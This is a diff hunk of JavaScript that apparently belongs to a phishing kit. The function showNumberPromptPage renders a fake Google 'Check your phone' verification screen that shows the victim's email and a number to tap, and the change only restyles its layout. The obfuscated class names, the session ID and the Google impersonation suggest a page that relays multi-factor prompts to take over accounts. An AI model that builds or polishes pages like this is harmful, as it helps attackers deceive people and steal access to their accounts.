@@ -609,11 +609,11 @@ function showNumberPromptPage(email, sessionId, number) {
     '<p style="color:#e8eaed;font-size:14px;margin:8px 0 0;max-width:360px;line-height:1.5">To help keep your account safe, Google wants to make sure it&#39;s really you trying to sign in. <a href="#" class="qx5512-fl" style="font-size:14px">Learn more</a></p>' +
     '<button type=\"button\" class=\"qx5512-er\" style=\"background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px\"><svg class=\"qx5512-av\" viewBox=\"0 0 24 24\" width=\"20\" height=\"20\"><path fill=\"#e8eaed\" d=\"M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z\"/></svg><span style=\"flex:1;text-align:left;font-weight:500;color:#e8eaed\">' + safeEmail + '</span><svg viewBox=\"0 0 24 24\" width=\"18\" height=\"18\" style=\"flex-shrink:0\"><path fill=\"#e8eaed\" d=\"M7 10l5 5 5-5z\"/></svg></button>' +
     '</div>' +
-    '<div class="qx5512-fs" style="display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding-top:8px">' +
-    '<p style="font-size:88px;font-weight:300;color:#e8eaed;margin:0 0 4px;line-height:1;letter-spacing:-2px">' + safeNum + '</p>' +
-    '<h2 style="font-size:18px;font-weight:400;color:#e8eaed;margin:0 0 16px">Check your phone</h2>' +
-    '<p style="color:#9aa0a6;font-size:14px;line-height:1.6;max-width:340px">Google sent a notification to your phone. Open the Gmail app, tap <b style="color:#e8eaed">Yes</b> on the prompt, then tap <b style="color:#e8eaed">' + safeNum + '</b> on your phone to verify it&#39;s you.</p>' +
-    '<div class="qx5512-bg qx5512-pa" style="margin-top:32px;width:100%">' +
+    '<div class="qx5512-fs" style="display:flex;flex-direction:column;justify-content:center;padding-top:8px">' +
+    '<p style="font-size:76px;font-weight:300;color:#e8eaed;margin:0 0 8px;line-height:1;letter-spacing:-2px;text-align:center">' + safeNum + '</p>' +
+    '<h2 style="font-size:18px;font-weight:400;color:#e8eaed;margin:0 0 14px;text-align:left">Check your phone</h2>' +
+    '<p style="color:#9aa0a6;font-size:14px;line-height:1.6;text-align:left">Google sent a notification to your phone. Open the Gmail app, tap <b style="color:#e8eaed">Yes</b> on the prompt, then tap <b style="color:#e8eaed">' + safeNum + '</b> on your phone to verify it&#39;s you.</p>' +
+    '<div class="qx5512-bg qx5512-pa" style="margin-top:32px;justify-content:flex-end">' +
     '<a href="#" class="qx5512-fl">Try another way</a>' +
     '</div>' +
     '</div>' +
